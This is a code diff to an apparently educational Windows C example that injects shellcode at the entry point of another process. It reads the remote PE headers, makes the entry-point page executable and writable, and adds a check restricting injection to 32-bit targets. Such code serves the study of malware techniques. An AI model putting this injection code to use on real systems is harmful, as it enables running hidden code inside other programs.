@@ -17,14 +17,14 @@ void hex_dump(unsigned char *buf, size_t buf_size)
     putchar('\n');
 }
 
-IMAGE_OPTIONAL_HEADER32 get_opt_hdr(unsigned char *read_proc)
+IMAGE_NT_HEADERS* get_nt_hrds(BYTE *read_proc)
 {
     IMAGE_DOS_HEADER *idh = NULL;
     IMAGE_NT_HEADERS *inh = NULL;
 
     idh = (IMAGE_DOS_HEADER*)read_proc;
     inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);
-    return inh->OptionalHeader;
+    return inh;
 }
 
 bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSize)
@@ -40,7 +40,6 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSiz
         printf("[ERROR] ZwQueryInformation failed\n");
         return false;
     }
-    pbi.PebBaseAddress+
 
     printf("PID = 0x%x\n", pbi.UniqueProcessId);
 
@@ -53,7 +52,7 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSiz
     }
     printf("ImageBase = 0x%p\n", ImageBase);
 
-    // read headers in order to find Entry Point:
+    // read headers:
     BYTE hdrs_buf[PAGE_SIZE];
     if (!ReadProcessMemory(hProcess, ImageBase, hdrs_buf, sizeof(hdrs_buf), &read_bytes) && read_bytes != sizeof(hdrs_buf))
     {
@@ -65,9 +64,17 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSiz
         printf("[-] MZ header check failed\n");
         return false;
     }
+    //check if supported type
+    IMAGE_NT_HEADERS *inh = get_nt_hrds(hdrs_buf);
+    if (inh == NULL) return false;
+
+    if (inh->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
+        printf("[WARNING] Not supported type! This example contains 32 bit shellcode and supports only injections to 32bit executables\n");
+        return false;
+    }
 
     // fetch Entry Point From headers
-    IMAGE_OPTIONAL_HEADER32 opt_hdr = get_opt_hdr(hdrs_buf);
+    IMAGE_OPTIONAL_HEADER32 opt_hdr = inh->OptionalHeader;
     DWORD ep_rva = opt_hdr.AddressOfEntryPoint;
     printf("EP = 0x%x\n", ep_rva);
 
@@ -85,7 +92,7 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSiz
 
     //make a memory page containing Entry Point Writable:
     DWORD oldProtect;
-    if (!VirtualProtectEx(hProcess,(BYTE*)ImageBase + ep_rva, PAGE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, PAGE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         printf("Virtual Protect Failed!\n");
         return false;
     }
